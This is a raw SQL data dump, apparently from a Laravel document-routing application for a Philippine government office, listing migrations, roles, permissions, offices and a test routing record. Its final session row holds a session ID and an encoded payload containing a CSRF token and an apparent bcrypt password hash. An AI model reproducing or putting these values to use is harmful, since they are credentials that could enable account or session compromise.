('14', 'Open', '2', '2', 'General Services Division (GSD)', 'Jojo', 'Complaints', 'Hardcopy', '', 'dasdasdasdasd', 'Courier', '', 'Unit Head', '', 'unithead@arta.gov.ph', '', '', '', '', '- ', '', '', 'Unit Head', '21', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', 'Finance and Administrative Office (FAO)', 'General Services Division (GSD)', '', '', '2022-02-07 21:49:17', '2022-02-07 21:49:17', NULL),
('id', 'dts_no', 'status', 'department', 'department_id', 'office', 'office_id', 'div_unit', 'div_unit_id', 'personnel', 'personnel_id', 'action_req', 'subject', 'file_upload', 'note_comment', 'assigned_date', 'due_date', 'cc_email', 'doc_class', 'doc_type', 'sent_date', 'sent_time', 'modeoftrans', 'routed_by', 'routed_by_div_unit', 'modified_at', 'created_at', 'updated_at', 'open_at', NULL, NULL, NULL),
('17', '14', 'New', '1', '', '1', '', 'Special Project Management Teams', '4', 'User1', '', 'For compliance/implementation', 'sadsadasdasdasd', 'files/k9WX77OJWrXzokxunn9uaEYkrpjd0XjnW8Tu2pdJ.jpg', '- ', '2022-02-07 21:50:01', '', '- ', '', '', '', '', 'E-DTS', 'Unit Head', 'General Services Division (GSD)', '', '2022-02-07 21:50:02', '2022-02-07 21:50:02', '', NULL, NULL, NULL),
('id', 'migration', 'batch', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('20', '2014_10_12_000000_create_users_table', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('21', '2014_10_12_100000_create_password_resets_table', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('22', '2014_10_12_200000_add_two_factor_columns_to_users_table', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('23', '2019_08_19_000000_create_failed_jobs_table', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('24', '2019_12_14_000001_create_personal_access_tokens_table', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('25', '2021_05_28_074221_create_sessions_table', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('26', '2021_06_30_031423_create_dropdown_list_table', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('27', '2021_07_05_122729_create_uploads_table', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('28', '2021_07_23_091805_create_permission_tables', '2', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('29', '2021_08_23_204442_create_department_table', '3', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('30', '2021_08_23_205128_create_office_table', '3', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('31', '2021_08_23_205326_create_div_unit_table', '3', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('32', '2021_10_12_221312_create_ex_route_table', '3', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('33', '2021_10_15_142524_update_externals_table', '4', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('34', '2021_10_28_200826_add_columns_to_exroute_table', '5', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('35', '2021_11_05_083720_rename_action_in_ex_route_table', '6', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('36', '2021_11_05_085729_add_default_value_in_ex_reoute_table', '7', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('37', '2021_11_16_193433_create_in_route_table', '8', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('38', '2021_11_18_140258_add_column_in_ex_route_table', '9', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('39', '2021_11_19_131937_add_columns', '10', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('40', '2021_11_24_094834_add_multiple_columns', '11', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('41', '2021_11_24_102258_add_column_in_user_table', '12', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('42', '2022_01_10_181640_create_permission_tables', '13', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('43', '2022_01_10_235008_create_products_table', '14', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('44', '2022_01_31_161221_add_multiple_column_to_ex_in_table', '15', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('permission_id', 'model_type', 'model_id', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('9', 'App\\Models\\User', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('10', 'App\\Models\\User', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('11', 'App\\Models\\User', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('12', 'App\\Models\\User', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('13', 'App\\Models\\User', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('14', 'App\\Models\\User', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('15', 'App\\Models\\User', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('16', 'App\\Models\\User', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('role_id', 'model_type', 'model_id', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('4', 'App\\Models\\User', '1', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('7', 'App\\Models\\User', '21', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('8', 'App\\Models\\User', '16', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('8', 'App\\Models\\User', '24', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('8', 'App\\Models\\User', '25', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('9', 'App\\Models\\User', '22', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('10', 'App\\Models\\User', '23', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('id', 'name', 'slug', 'department_id', 'created_at', 'updated_at', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('1', 'Special Project Management Office (SPMO)', 'SPMO', '1', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('2', 'Finance and Administrative Office (FAO)', 'FAO', '2', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('3', 'Investigation, Enforcement and Litigation Office (IELO)', 'IELO', '3', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('4', 'Legal and Public Assistance Office (LPAO)', 'LPAO', '3', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('5', 'Better Regulations Office (BRO)', 'BRO', '4', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('6', 'Compliance Monitoring and Evaluation Office (CMEO)', 'CMEO', '4', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('email', 'token', 'created_at', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('id', 'name', 'guard_name', 'created_at', 'updated_at', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('9', 'role-list', 'web', '2022-01-11 00:31:22', '2022-01-11 00:31:22', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('10', 'role-create', 'web', '2022-01-11 00:31:25', '2022-01-11 00:31:25', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('11', 'role-edit', 'web', '2022-01-11 00:31:26', '2022-01-11 00:31:26', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('12', 'role-delete', 'web', '2022-01-11 00:31:26', '2022-01-11 00:31:26', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('13', 'user-list', 'web', '2022-01-11 00:31:26', '2022-01-11 00:31:26', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('14', 'user-create', 'web', '2022-01-11 00:31:27', '2022-01-11 00:31:27', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('15', 'user-edit', 'web', '2022-01-11 00:31:27', '2022-01-11 00:31:27', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('16', 'user-delete', 'web', '2022-01-11 00:31:27', '2022-01-11 00:31:27', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('17', 'department_status', 'web', '2022-02-03 09:21:02', '2022-02-03 09:21:02', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('18', 'office_status', 'web', '2022-02-03 09:21:02', '2022-02-03 09:21:02', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('19', 'div_unit_status', 'web', '2022-02-03 09:22:25', '2022-02-03 09:22:25', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('id', 'tokenable_type', 'tokenable_id', 'name', 'token', 'abilities', 'last_used_at', 'created_at', 'updated_at', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('id', 'name', 'detail', 'created_at', 'updated_at', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('id', 'name', 'guard_name', 'created_at', 'updated_at', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('4', 'SuperAdmin', 'web', '2022-01-11 00:31:55', '2022-01-11 00:31:55', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('5', 'Admin', 'web', '2022-01-11 03:00:26', '2022-01-11 03:00:26', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('7', 'Head', 'web', '2022-01-11 03:12:52', '2022-01-11 03:12:52', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('8', 'User', 'web', '2022-01-11 18:42:17', '2022-01-11 18:42:17', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('9', 'Director', 'web', '2022-02-06 17:22:34', '2022-02-06 17:22:34', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('10', 'ODDG', 'web', '2022-02-06 17:27:07', '2022-02-06 17:27:07', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('permission_id', 'role_id', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('9', '4', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('9', '5', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('10', '4', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('11', '4', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('11', '5', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('12', '4', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('13', '4', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('13', '5', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('14', '4', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('15', '4', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('15', '5', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('16', '4', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('17', '4', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('17', '5', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('17', '10', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('18', '4', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('18', '5', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('18', '9', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('19', '4', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('19', '5', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('19', '7', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('id', 'user_id', 'ip_address', 'user_agent', 'payload', 'last_activity', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('2t3gW0To2o9bUUXJbEpjtfAELjWV68GwABhjBigk', '1', '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.50', 'YTo2OntzOjY6Il90b2tlbiI7czo0MDoiQVJINDg0MXhpdWFuV0hGQXJ5dGVkWUZYS29Ic1NqN092Z3owcVhKdiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MzM6Imh0dHA6Ly8xMjcuMC4wLjE6ODAwMC9hZG1pbi9yb2xlcyI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fXM6NTA6ImxvZ2luX3dlYl81OWJhMzZhZGRjMmIyZjk0MDE1ODBmMDE0YzdmNThlYTRlMzA5ODlkIjtpOjE7czoxNzoicGFzc3dvcmRfaGFzaF93ZWIiO3M6NjA6IiQyeSQxMCRhbjBUVDZzaGxJSVFVdlBwbjNwZkx1T2RHLzUxSmUycVVaaTZwY1hRM0ljbDEuS2lzR0FJYSI7czoyMToicGFzc3dvcmRfaGFzaF9zYW5jdHVtIjtzOjYwOiIkMnkkMTAkYW4wVFQ2c2hsSUlRVXZQcG4zcGZMdU9kRy81MUplMnFVWmk2cGNYUTNJY2wxLktpc0dBSWEiO30=', '1644923703', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
